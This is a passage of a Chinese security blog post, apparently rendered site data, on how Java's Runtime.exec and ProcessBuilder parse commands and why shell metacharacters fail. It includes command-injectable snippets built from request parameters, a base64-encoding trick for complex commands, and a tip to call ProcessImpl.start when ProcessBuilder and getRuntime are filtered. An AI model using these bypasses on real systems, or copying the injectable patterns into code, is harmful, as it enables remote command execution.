}\n```\n实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。\n\n原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。\n\n所以Java下的命令稍微改造一下代码就好。\n\n还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。\n\n![](img/24.png)\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start\n\n# 小结\n\n其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。\n\n所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。\n\njava的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/JAVA奇怪的命令执行.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;digest&quot;:[0,&quot;d35953b4d44114a7&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;前言\&quot;&gt;前言&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#前言\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;首先Java下的命令执行大家都知道常见的两种方式：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;使用ProcessBuilder&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ProcessBuilder pb=new ProcessBuilder(cmd);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pb.start();&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;使用Runtime&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;#x3C;,&gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。&lt;/p&gt;\n&lt;h1 id=\&quot;差别\&quot;&gt;差别&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#差别\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;先选择跟进&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;样例代码如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;import&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; java.io.&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;*&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; class&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; Main&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; static&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; void&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; main&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] &lt;/span&gt;&lt;span style=\&quot;color:#E36209;--shiki-dark:#FFAB70\&quot;&gt;arg&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;throws&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String command&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        Process proc &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Runtime.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getRuntime&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;().&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        InputStream in &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; proc.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getInputStream&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        BufferedReader br &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; BufferedReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; InputStreamReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(in, &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;UTF8\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;));&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String line &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        while&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;((line&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;br.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;readLine&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;())&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;!=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;            System.out.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;println&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(line);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray[]，也就是传入一个数组。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String cmdarray[]) throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;     }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;而根据前面代码中，我们传入的命令是如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;所以会进入&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Process exec(String command)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这个构造方法进行处理，跟进这个方法，发现最后返回&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exec(command, null, null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String command) throws IOException {        return exec(command, null, null);    }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/22.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray[]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/23.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       return new ProcessBuilder(cmdarray)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;          .environment(envp)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .directory(dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .start();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。&lt;/p&gt;\n&lt;p&gt;然后继续往下走，这里调用java.lang.ProcessImpl.start。&lt;/p&gt;\n&lt;p&gt;进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。&lt;/p&gt;\n&lt;p&gt;这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c “echo 111 &gt; 3.txt”，看这两段代码的命令执行的效果。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;首先先看\n&lt;code&gt;String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/code&gt;\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{“/bin/sh”,“-c”,\&quot;\&quot;echo”,“111”、”&gt;”,“3.txt\&quot;\&quot;}。&lt;/p&gt;\n&lt;p&gt;而当前内存开辟一个12473进程，并且确实12473执行sh命令。&lt;/p&gt;\n&lt;p&gt;但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。&lt;/p&gt;\n&lt;p&gt;也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。&lt;/p&gt;\n&lt;p&gt;下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;url\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;/bin/sh -c \&quot;+ 